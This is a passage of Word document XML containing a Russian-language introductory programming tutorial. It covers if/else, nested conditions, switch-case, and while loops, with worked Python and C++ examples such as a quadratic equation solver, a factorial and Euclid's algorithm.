        <w:t xml:space="preserve">    print("Отрицательное")</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Ноль")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: -3</w:t>
        <w:br/>
        <w:t>Отрицательное</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>4. Вложенные условия (if внутри if)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Условие внутри условия.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Нужно для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сложных проверок</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Нахождение максимума из трёх чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = int(input("a = "))</w:t>
        <w:br/>
        <w:t>b = int(input("b = "))</w:t>
        <w:br/>
        <w:t>c = int(input("c = "))</w:t>
        <w:br/>
        <w:br/>
        <w:t>if a &gt;= b:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if a &gt;= c:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        max_val = a</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        max_val = c</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if b &gt;= c:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        max_val = b</w:t>
        <w:br/>
        <w:t xml:space="preserve">    else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        max_val = c</w:t>
        <w:br/>
        <w:br/>
        <w:t>print(f"Максимум: {max_val}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = 5</w:t>
        <w:br/>
        <w:t>b = 12</w:t>
        <w:br/>
        <w:t>c = 8</w:t>
        <w:br/>
        <w:t>Максимум: 12</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Альтернативный способ (без вложенности):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = 5</w:t>
        <w:br/>
        <w:t>b = 12</w:t>
        <w:br/>
        <w:t>c = 8</w:t>
        <w:br/>
        <w:t>max_val = max(a, b, c)</w:t>
        <w:br/>
        <w:t>print(f"Максимум: {max_val}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Встроенная функция `max()` — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>красота</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Но на экзамене тебя могут попросить написать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>вручную</w:t>
      </w:r>
      <w:r>
        <w:t>, так что знай оба способа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: Решение квадратного уравнения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Решить уравнение \(ax^2 + bx + c = 0\).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Вычислить дискриминант \(D = b^2 - 4ac\)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если \(D &gt; 0\) — два корня: \(x_1 = \frac{-b + \sqrt{D}}{2a}\), \(x_2 = \frac{-b - \sqrt{D}}{2a}\)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если \(D = 0\) — один корень: \(x = \frac{-b}{2a}\)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Если \(D &lt; 0\) — корней нет (в действительных числах)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>import math</w:t>
        <w:br/>
        <w:br/>
        <w:t>a = float(input("a = "))</w:t>
        <w:br/>
        <w:t>b = float(input("b = "))</w:t>
        <w:br/>
        <w:t>c = float(input("c = "))</w:t>
        <w:br/>
        <w:br/>
        <w:t>D = b**2 - 4*a*c</w:t>
        <w:br/>
        <w:br/>
        <w:t>if D &gt; 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    x1 = (-b + math.sqrt(D)) / (2*a)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    x2 = (-b - math.sqrt(D)) / (2*a)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"Два корня: x1 = {x1}, x2 = {x2}")</w:t>
        <w:br/>
        <w:t>elif D == 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    x = -b / (2*a)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(f"Один корень: x = {x}")</w:t>
        <w:br/>
        <w:t>else:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print("Корней нет (дискриминант отрицательный)")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение (D &gt; 0):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = 1</w:t>
        <w:br/>
        <w:t>b = -3</w:t>
        <w:br/>
        <w:t>c = 2</w:t>
        <w:br/>
        <w:t>Два корня: x1 = 2.0, x2 = 1.0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение (D = 0):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = 1</w:t>
        <w:br/>
        <w:t>b = -2</w:t>
        <w:br/>
        <w:t>c = 1</w:t>
        <w:br/>
        <w:t>Один корень: x = 1.0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение (D &lt; 0):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = 1</w:t>
        <w:br/>
        <w:t>b = 0</w:t>
        <w:br/>
        <w:t>c = 1</w:t>
        <w:br/>
        <w:t>Корней нет (дискриминант отрицательный)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Switch-case (множественный выбор)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В языках типа C++, Java, Go есть конструкция </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>switch-case</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для удобного множественного выбора.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (C++):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>switch (переменная) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    case значение1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        действие1;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    case значение2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        действие2;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    default:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        действие_по_умолчанию;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример: Меню выбора операции</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>#include &lt;iostream&gt;</w:t>
        <w:br/>
        <w:t>using namespace std;</w:t>
        <w:br/>
        <w:br/>
        <w:t>int main() {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    int choice;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cout &lt;&lt; "Выберите операцию (1-4): ";</w:t>
        <w:br/>
        <w:t xml:space="preserve">    cin &gt;&gt; choice;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    switch (choice) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        case 1:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            cout &lt;&lt; "Сложение" &lt;&lt; endl;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        case 2:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            cout &lt;&lt; "Вычитание" &lt;&lt; endl;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        case 3:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            cout &lt;&lt; "Умножение" &lt;&lt; endl;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        case 4:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            cout &lt;&lt; "Деление" &lt;&lt; endl;</w:t>
        <w:br/>
        <w:t xml:space="preserve">            break;</w:t>
        <w:br/>
        <w:t xml:space="preserve">        default:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            cout &lt;&lt; "Неверный выбор" &lt;&lt; endl;</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    return 0;</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> В C++ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обязательно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ставить `break`, иначе выполнение "провалится" в следующий `case` (это называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>fall-through</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). В Python </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> `switch` до версии 3.10 (там добавили `match-case`).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.4. Цикл с предусловием (while)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цикл с предусловием (while)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это конструкция, которая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>повторяет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> блок команд, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>пока условие истинно</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Схема:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    ◇ Условие?</w:t>
        <w:br/>
        <w:t xml:space="preserve">    /       \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  Да         Нет</w:t>
        <w:br/>
        <w:t xml:space="preserve">  /           \</w:t>
        <w:br/>
        <w:t>Тело цикла   Выход</w:t>
        <w:br/>
        <w:t xml:space="preserve">  |</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ↓</w:t>
        <w:br/>
        <w:t>(вернуться к проверке условия)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ключевая особенность:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Условие проверяется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>перед</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> выполнением тела цикла. Если условие сразу ложно — тело </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не выполнится ни разу</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (псевдокод):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пока &lt;условие&gt;:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    &lt;тело цикла&gt;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Синтаксис (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>while условие:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    тело_цикла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Вывод чисел от 1 до 10</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>i = 1</w:t>
        <w:br/>
        <w:t>while i &lt;= 10:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(i)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    i += 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
        <w:br/>
        <w:t>2</w:t>
        <w:br/>
        <w:t>3</w:t>
        <w:br/>
        <w:t>4</w:t>
        <w:br/>
        <w:t>5</w:t>
        <w:br/>
        <w:t>6</w:t>
        <w:br/>
        <w:t>7</w:t>
        <w:br/>
        <w:t>8</w:t>
        <w:br/>
        <w:t>9</w:t>
        <w:br/>
        <w:t>10</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пошаговое выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Шаг 1: i = 1, i &lt;= 10? Да → вывод 1, i = 2</w:t>
        <w:br/>
        <w:t>Шаг 2: i = 2, i &lt;= 10? Да → вывод 2, i = 3</w:t>
        <w:br/>
        <w:t>...</w:t>
        <w:br/>
        <w:t>Шаг 10: i = 10, i &lt;= 10? Да → вывод 10, i = 11</w:t>
        <w:br/>
        <w:t>Шаг 11: i = 11, i &lt;= 10? Нет → выход из цикла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Факториал числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычислить \(n! = 1 \times 2 \times 3 \times ... \times n\).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм Факториал(n):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result = 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    i = 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Пока i &lt;= n:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        result = result × i</w:t>
        <w:br/>
        <w:t xml:space="preserve">        i = i + 1</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Вернуть result</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>n = int(input("Введите число: "))</w:t>
        <w:br/>
        <w:t>result = 1</w:t>
        <w:br/>
        <w:t>i = 1</w:t>
        <w:br/>
        <w:t>while i &lt;= n:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result *= i</w:t>
        <w:br/>
        <w:t xml:space="preserve">    i += 1</w:t>
        <w:br/>
        <w:t>print(f"{n}! = {result}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Введите число: 5</w:t>
        <w:br/>
        <w:t>5! = 120</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пошаговое выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>i = 1: result = 1 × 1 = 1</w:t>
        <w:br/>
        <w:t>i = 2: result = 1 × 2 = 2</w:t>
        <w:br/>
        <w:t>i = 3: result = 2 × 3 = 6</w:t>
        <w:br/>
        <w:t>i = 4: result = 6 × 4 = 24</w:t>
        <w:br/>
        <w:t>i = 5: result = 24 × 5 = 120</w:t>
        <w:br/>
        <w:t>i = 6: i &gt; n → выход</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Алгоритм Евклида (НОД)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Найти наибольший общий делитель (НОД) двух чисел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Алгоритм:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Пока b ≠ 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    r = a mod b</w:t>
        <w:br/>
        <w:t xml:space="preserve">    a = b</w:t>
        <w:br/>
        <w:t xml:space="preserve">    b = r</w:t>
        <w:br/>
        <w:t>Вернуть a</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программный код (Python):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = int(input("a = "))</w:t>
        <w:br/>
        <w:t>b = int(input("b = "))</w:t>
        <w:br/>
        <w:br/>
        <w:t>while b != 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    a, b = b, a % b</w:t>
        <w:br/>
        <w:br/>
        <w:t>print(f"НОД = {a}")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выполнение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>a = 48</w:t>
        <w:br/>
        <w:t>b = 18</w:t>
        <w:br/>
        <w:t>НОД = 6</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Когда цикл не выполнится ни разу?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Если условие </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>изначально ложно</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, тело цикла </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не выполнится</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>i = 20</w:t>
        <w:br/>
        <w:t>while i &lt;= 10:</w:t>
        <w:br/>
        <w:t xml:space="preserve">    print(i)  # Не выполнится</w:t>
        <w:br/>
        <w:t xml:space="preserve">    i += 1</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Условие `i &lt;= 10` сразу ложно (20 &gt; 10), поэтому цикл пропускается.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.2.5. Цикл с постусловием (do-while)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Определение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Цикл с постусловием (do-while)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это конструкция, которая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
